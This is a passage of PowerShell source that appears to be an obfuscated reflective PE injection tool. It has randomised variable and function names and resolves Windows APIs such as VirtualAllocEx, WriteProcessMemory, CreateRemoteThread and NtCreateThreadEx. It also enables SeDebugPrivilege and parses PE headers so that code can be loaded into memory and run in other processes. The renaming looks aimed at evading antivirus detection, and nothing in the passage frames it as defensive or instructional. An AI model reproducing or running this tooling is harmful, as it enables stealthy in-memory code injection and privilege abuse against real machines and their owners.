		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}
	Function filbert
	{
		$cxFnWjaC99 = New-Object System.Object
		
		$iqGRLTEW99 = agenda kernel32.dll VirtualAlloc
		$qCiwueFS99 = bucksaws @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$iFOQufoO99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($iqGRLTEW99, $qCiwueFS99)
		$cxFnWjaC99 | Add-Member NoteProperty -Name VirtualAlloc -Value $iFOQufoO99
		
		$hhxhsyTU99 = agenda kernel32.dll VirtualAllocEx
		$QASznDpz99 = bucksaws @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$vGeibWZk99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($hhxhsyTU99, $QASznDpz99)
		$cxFnWjaC99 | Add-Member NoteProperty -Name VirtualAllocEx -Value $vGeibWZk99
		
		$sEzGwFWU99 = agenda msvcrt.dll memcpy
		$mamsaaDv99 = bucksaws @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$CqWGTaGI99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($sEzGwFWU99, $mamsaaDv99)
		$cxFnWjaC99 | Add-Member -MemberType NoteProperty -Name memcpy -Value $CqWGTaGI99
		
		$IRGYDIDj99 = agenda msvcrt.dll memset
		$ityTRDqA99 = bucksaws @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$DVlnNVJL99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IRGYDIDj99, $ityTRDqA99)
		$cxFnWjaC99 | Add-Member -MemberType NoteProperty -Name memset -Value $DVlnNVJL99
		
		$ZxmloRrA99 = agenda kernel32.dll LoadLibraryA
		$rOQzeOnA99 = bucksaws @([String]) ([IntPtr])
		$rkdSSedr99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ZxmloRrA99, $rOQzeOnA99)
		$cxFnWjaC99 | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $rkdSSedr99
		
		$ltdDGrVH99 = agenda kernel32.dll GetProcAddress
		$bloPDipj99 = bucksaws @([IntPtr], [String]) ([IntPtr])
		$oxeSfNQo99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ltdDGrVH99, $bloPDipj99)
		$cxFnWjaC99 | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $oxeSfNQo99
		
		$fNGkpflS99 = agenda kernel32.dll GetProcAddress
		$DwnPqCyl99 = bucksaws @([IntPtr], [IntPtr]) ([IntPtr])
		$kEKIQhAn99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($fNGkpflS99, $DwnPqCyl99)
		$cxFnWjaC99 | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $kEKIQhAn99
		
		$zJfEhhPE99 = agenda kernel32.dll VirtualFree
		$doSxfRPE99 = bucksaws @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$tOQkvyRJ99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($zJfEhhPE99, $doSxfRPE99)
		$cxFnWjaC99 | Add-Member NoteProperty -Name VirtualFree -Value $tOQkvyRJ99
		
		$zCpKMgBO99 = agenda kernel32.dll VirtualFreeEx
		$VgRvXhAt99 = bucksaws @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$YKviMVet99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($zCpKMgBO99, $VgRvXhAt99)
		$cxFnWjaC99 | Add-Member NoteProperty -Name VirtualFreeEx -Value $YKviMVet99
		
		$ynbQLBSR99 = agenda kernel32.dll VirtualProtect
		$syrwfLds99 = bucksaws @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$BIWfPNqH99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ynbQLBSR99, $syrwfLds99)
		$cxFnWjaC99 | Add-Member NoteProperty -Name VirtualProtect -Value $BIWfPNqH99
		
		$rkJRLSed99 = agenda kernel32.dll GetModuleHandleA
		$rhahVIAH99 = bucksaws @([String]) ([IntPtr])
		$iMewgoOq99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($rkJRLSed99, $rhahVIAH99)
		$cxFnWjaC99 | Add-Member NoteProperty -Name GetModuleHandle -Value $iMewgoOq99
		
		$aSvxsrEk99 = agenda kernel32.dll FreeLibrary
		$PxgrVOdq99 = bucksaws @([IntPtr]) ([Bool])
		$EnFhHtMI99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($aSvxsrEk99, $PxgrVOdq99)
		$cxFnWjaC99 | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $EnFhHtMI99
		
		$JuERhEVO99 = agenda kernel32.dll OpenProcess
	    $GZuyiLAh99 = bucksaws @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $hTRJQiix99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($JuERhEVO99, $GZuyiLAh99)
		$cxFnWjaC99 | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $hTRJQiix99
		
		$JtzRWnxJ99 = agenda kernel32.dll WaitForSingleObject
	    $UvglKdsf99 = bucksaws @([IntPtr], [UInt32]) ([UInt32])
	    $goioaBbA99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($JtzRWnxJ99, $UvglKdsf99)
		$cxFnWjaC99 | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $goioaBbA99
		
		$IlYoQThW99 = agenda kernel32.dll WriteProcessMemory
        $dQSlwSfS99 = bucksaws @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $vaXIapaB99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IlYoQThW99, $dQSlwSfS99)
		$cxFnWjaC99 | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $vaXIapaB99
		
		$GzKhcvaW99 = agenda kernel32.dll ReadProcessMemory
        $FwzvZqtA99 = bucksaws @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $VvhQOAOo99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GzKhcvaW99, $FwzvZqtA99)
		$cxFnWjaC99 | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $VvhQOAOo99
		
		$teeHqjIC99 = agenda kernel32.dll CreateRemoteThread
        $gimFYzwo99 = bucksaws @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $NFFKWGqq99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($teeHqjIC99, $gimFYzwo99)
		$cxFnWjaC99 | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $NFFKWGqq99
		
		$VzPoRlgX99 = agenda kernel32.dll GetExitCodeThread
        $QLbSjHBX99 = bucksaws @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $BYiDyGhL99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VzPoRlgX99, $QLbSjHBX99)
		$cxFnWjaC99 | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $BYiDyGhL99
		
		$EwWTIFXw99 = agenda Advapi32.dll OpenThreadToken
        $dvgpNMzI99 = bucksaws @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $ZfukmvxX99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($EwWTIFXw99, $dvgpNMzI99)
		$cxFnWjaC99 | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $ZfukmvxX99
		
		$uWduavZf99 = agenda kernel32.dll GetCurrentThread
        $xMhQsauB99 = bucksaws @() ([IntPtr])
        $AnCAmBtd99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($uWduavZf99, $xMhQsauB99)
		$cxFnWjaC99 | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $AnCAmBtd99
		
		$bUOnBeqf99 = agenda Advapi32.dll AdjustTokenPrivileges
        $VpSiNFQE99 = bucksaws @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $KrBHkeaP99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($bUOnBeqf99, $VpSiNFQE99)
		$cxFnWjaC99 | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $KrBHkeaP99
		
		$IVwflEic99 = agenda Advapi32.dll LookupPrivilegeValueA
        $hvxsDdgD99 = bucksaws @([String], [String], [IntPtr]) ([Bool])
        $UWNjiltC99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IVwflEic99, $hvxsDdgD99)
		$cxFnWjaC99 | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $UWNjiltC99
		
		$zzfXdYMw99 = agenda Advapi32.dll ImpersonateSelf
        $pBzrEIHk99 = bucksaws @([Int32]) ([Bool])
        $KBcTJQXA99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($zzfXdYMw99, $pBzrEIHk99)
		$cxFnWjaC99 | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $KBcTJQXA99
		
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
		    $sZUjeZUh99 = agenda NtDll.dll NtCreateThreadEx
            $WxAzonaV99 = bucksaws @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $qMpyCsBU99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($sZUjeZUh99, $WxAzonaV99)
		    $cxFnWjaC99 | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $qMpyCsBU99
        }
		
		$BsXnDfEr99 = agenda Kernel32.dll IsWow64Process
        $qXIUUdBA99 = bucksaws @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $czIYlOpJ99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($BsXnDfEr99, $qXIUUdBA99)
		$cxFnWjaC99 | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $czIYlOpJ99
		
		$ArjTLFhm99 = agenda Kernel32.dll CreateThread
        $wGvfBBCh99 = bucksaws @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $lnSXWlKw99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ArjTLFhm99, $wGvfBBCh99)
		$cxFnWjaC99 | Add-Member -MemberType NoteProperty -Name CreateThread -Value $lnSXWlKw99
	
		$rrTEWDBt99 = agenda kernel32.dll VirtualFree
		$MpJVWdIv99 = bucksaws @([IntPtr])
		$BpRhdzge99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($rrTEWDBt99, $MpJVWdIv99)
		$cxFnWjaC99 | Add-Member NoteProperty -Name LocalFree -Value $BpRhdzge99
		return $cxFnWjaC99
	}
			
	Function stalls
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$xMWFICgX99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$CteJRAlU99
		)
		
		[Byte[]]$lMNYeJOh99 = [BitConverter]::GetBytes($xMWFICgX99)
		[Byte[]]$QalywlPD99 = [BitConverter]::GetBytes($CteJRAlU99)
		[Byte[]]$DmoRKlrG99 = [BitConverter]::GetBytes([UInt64]0)
		if ($lMNYeJOh99.Count -eq $QalywlPD99.Count)
		{
			$ChfFBpDQ99 = 0
			for ($i = 0; $i -lt $lMNYeJOh99.Count; $i++)
			{
				$Val = $lMNYeJOh99[$i] - $ChfFBpDQ99
				if ($Val -lt $QalywlPD99[$i])
				{
					$Val += 256
					$ChfFBpDQ99 = 1
				}
				else
				{
					$ChfFBpDQ99 = 0
				}
				
				
				[UInt16]$Sum = $Val - $QalywlPD99[$i]
				$DmoRKlrG99[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($DmoRKlrG99, 0)
	}
	
	Function Balzac
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$xMWFICgX99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$CteJRAlU99
		)
		
		[Byte[]]$lMNYeJOh99 = [BitConverter]::GetBytes($xMWFICgX99)
		[Byte[]]$QalywlPD99 = [BitConverter]::GetBytes($CteJRAlU99)
		[Byte[]]$DmoRKlrG99 = [BitConverter]::GetBytes([UInt64]0)
		if ($lMNYeJOh99.Count -eq $QalywlPD99.Count)
		{
			$ChfFBpDQ99 = 0
			for ($i = 0; $i -lt $lMNYeJOh99.Count; $i++)
			{
				[UInt16]$Sum = $lMNYeJOh99[$i] + $QalywlPD99[$i] + $ChfFBpDQ99
				$DmoRKlrG99[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$ChfFBpDQ99 = 1
				}
				else
				{
					$ChfFBpDQ99 = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($DmoRKlrG99, 0)
	}
	
	Function harsh
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$xMWFICgX99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$CteJRAlU99
		)
		
		[Byte[]]$lMNYeJOh99 = [BitConverter]::GetBytes($xMWFICgX99)
		[Byte[]]$QalywlPD99 = [BitConverter]::GetBytes($CteJRAlU99)
		if ($lMNYeJOh99.Count -eq $QalywlPD99.Count)
		{
			for ($i = $lMNYeJOh99.Count-1; $i -ge 0; $i--)
			{
				if ($lMNYeJOh99[$i] -gt $QalywlPD99[$i])
				{
					return $true
				}
				elseif ($lMNYeJOh99[$i] -lt $QalywlPD99[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	
	Function meander
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$iqzxkKzS99 = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($iqzxkKzS99, 0))
	}
	
	
	Function Ferris
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$zTyLmNSe99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
	    [IntPtr]$fuTmEBfs99 = [IntPtr](Balzac ($StartAddress) ($Size))
		
		$bykAanQM99 = $PEInfo.EndAddress
		
		if ((harsh ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $zTyLmNSe99"
		}
		if ((harsh ($fuTmEBfs99) ($bykAanQM99)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $zTyLmNSe99"
		}
	}
	
	
	Function avuncular
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$qxCLnUIL99
		)
	
		for ($SPwPlOMy99 = 0; $SPwPlOMy99 -lt $Bytes.Length; $SPwPlOMy99++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($qxCLnUIL99, $SPwPlOMy99, $Bytes[$SPwPlOMy99])
		}
	}
	
	Function bucksaws
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $mnHrAGAW99 = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )
	    $IIxpTQJc99 = [AppDomain]::CurrentDomain
	    $WxgMnFUN99 = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $cmfciYgp99 = $IIxpTQJc99.DefineDynamicAssembly($WxgMnFUN99, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $lFEziVqC99 = $cmfciYgp99.DefineDynamicModule('InMemoryModule', $false)
	    $JfxRdmvb99 = $lFEziVqC99.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $psIJOLUy99 = $JfxRdmvb99.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $mnHrAGAW99)
	    $psIJOLUy99.SetImplementationFlags('Runtime, Managed')
	    $Pfikofxg99 = $JfxRdmvb99.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $mnHrAGAW99)
	    $Pfikofxg99.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $JfxRdmvb99.CreateType()
	}
	Function agenda
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $irzWFOZK99
	    )
	    $SsLMidzF99 = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $OSeohYPT99 = $SsLMidzF99.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    $iMewgoOq99 = $OSeohYPT99.GetMethod('GetModuleHandle')
	    $oxeSfNQo99 = $OSeohYPT99.GetMethod('GetProcAddress')
	    $HsnLKfCR99 = $iMewgoOq99.Invoke($null, @($Module))
	    $BGqWUfMn99 = New-Object IntPtr
	    $ZhRGlSBF99 = New-Object System.Runtime.InteropServices.HandleRef($BGqWUfMn99, $HsnLKfCR99)
	    Write-Output $oxeSfNQo99.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$ZhRGlSBF99, $irzWFOZK99))
	}
	
	
	Function handiwork
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$cxFnWjaC99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$DIEZeRqh99,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$dgqkamfB99 = $cxFnWjaC99.GetCurrentThread.Invoke()
		if ($dgqkamfB99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$XQpjqHdK99 = [IntPtr]::Zero
		[Bool]$rXPLntYP99 = $cxFnWjaC99.OpenThreadToken.Invoke($dgqkamfB99, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$XQpjqHdK99)
		if ($rXPLntYP99 -eq $false)
		{
			$UGJBywAX99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($UGJBywAX99 -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$rXPLntYP99 = $cxFnWjaC99.ImpersonateSelf.Invoke(3)
				if ($rXPLntYP99 -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				
				$rXPLntYP99 = $cxFnWjaC99.OpenThreadToken.Invoke($dgqkamfB99, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$XQpjqHdK99)
				if ($rXPLntYP99 -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $UGJBywAX99"
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$DIEZeRqh99.LUID))
		$rXPLntYP99 = $cxFnWjaC99.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($rXPLntYP99 -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}
		[UInt32]$rIKRRJza99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$DIEZeRqh99.TOKEN_PRIVILEGES)
		[IntPtr]$FXNBzOGW99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($rIKRRJza99)
		$oAlSjhUz99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FXNBzOGW99, [Type]$DIEZeRqh99.TOKEN_PRIVILEGES)
		$oAlSjhUz99.PrivilegeCount = 1
		$oAlSjhUz99.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$DIEZeRqh99.LUID)
		$oAlSjhUz99.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($oAlSjhUz99, $FXNBzOGW99, $true)
		$rXPLntYP99 = $cxFnWjaC99.AdjustTokenPrivileges.Invoke($XQpjqHdK99, $false, $FXNBzOGW99, $rIKRRJza99, [IntPtr]::Zero, [IntPtr]::Zero)
		$UGJBywAX99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($rXPLntYP99 -eq $false) -or ($UGJBywAX99 -ne 0))
		{
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($FXNBzOGW99)
	}
	
	
	Function utopia
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$vVbfBzxt99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$TtUKPpQO99 = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$cxFnWjaC99
		)
		
		[IntPtr]$WKzGyMOd99 = [IntPtr]::Zero
		
		$JlyCnhbE99 = [Environment]::OSVersion.Version
		if (($JlyCnhbE99 -ge (New-Object 'Version' 6,0)) -and ($JlyCnhbE99 -lt (New-Object 'Version' 6,2)))
		{
			Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$VUJICFyj99= $cxFnWjaC99.NtCreateThreadEx.Invoke([Ref]$WKzGyMOd99, 0x1FFFFF, [IntPtr]::Zero, $vVbfBzxt99, $StartAddress, $TtUKPpQO99, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$RtUkuHYC99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($WKzGyMOd99 -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $VUJICFyj99. LastError: $RtUkuHYC99"
			}
		}
		else
		{
			Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$WKzGyMOd99 = $cxFnWjaC99.CreateRemoteThread.Invoke($vVbfBzxt99, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $TtUKPpQO99, 0, [IntPtr]::Zero)
		}
		
		if ($WKzGyMOd99 -eq [IntPtr]::Zero)
		{
			Write-Verbose "Error creating remote thread, thread handle is null"
		}
		
		return $WKzGyMOd99
	}
	
	Function options
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$wGyvvcQf99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$DIEZeRqh99
		)
		
		$IdyDeYZx99 = New-Object System.Object
		
		$rjGjppFT99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($wGyvvcQf99, [Type]$DIEZeRqh99.IMAGE_DOS_HEADER)
		[IntPtr]$PwJfvmyI99 = [IntPtr](Balzac ([Int64]$wGyvvcQf99) ([Int64][UInt64]$rjGjppFT99.e_lfanew))
		$IdyDeYZx99 | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $PwJfvmyI99
		$BjkSqVnQ99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PwJfvmyI99, [Type]$DIEZeRqh99.IMAGE_NT_HEADERS64)
		
	    if ($BjkSqVnQ99.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		
		if ($BjkSqVnQ99.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$IdyDeYZx99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $BjkSqVnQ99
			$IdyDeYZx99 | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$uzQJtlaS99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PwJfvmyI99, [Type]$DIEZeRqh99.IMAGE_NT_HEADERS32)
			$IdyDeYZx99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $uzQJtlaS99
			$IdyDeYZx99 | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $IdyDeYZx99
	}
	Function demagoguery
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$IKHGtPzF99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$DIEZeRqh99
		)
		
		$PEInfo = New-Object System.Object
		
		[IntPtr]$fSKprvuy99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($IKHGtPzF99.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($IKHGtPzF99, 0, $fSKprvuy99, $IKHGtPzF99.Length) | Out-Null
		
		$IdyDeYZx99 = options -wGyvvcQf99 $fSKprvuy99 -DIEZeRqh99 $DIEZeRqh99
		
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($IdyDeYZx99.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($IdyDeYZx99.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($IdyDeYZx99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($IdyDeYZx99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($IdyDeYZx99.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($fSKprvuy99)
		
		return $PEInfo
	}
	Function splays
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$wGyvvcQf99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$DIEZeRqh99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($wGyvvcQf99 -eq $null -or $wGyvvcQf99 -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		
		$IdyDeYZx99 = options -wGyvvcQf99 $wGyvvcQf99 -DIEZeRqh99 $DIEZeRqh99
		
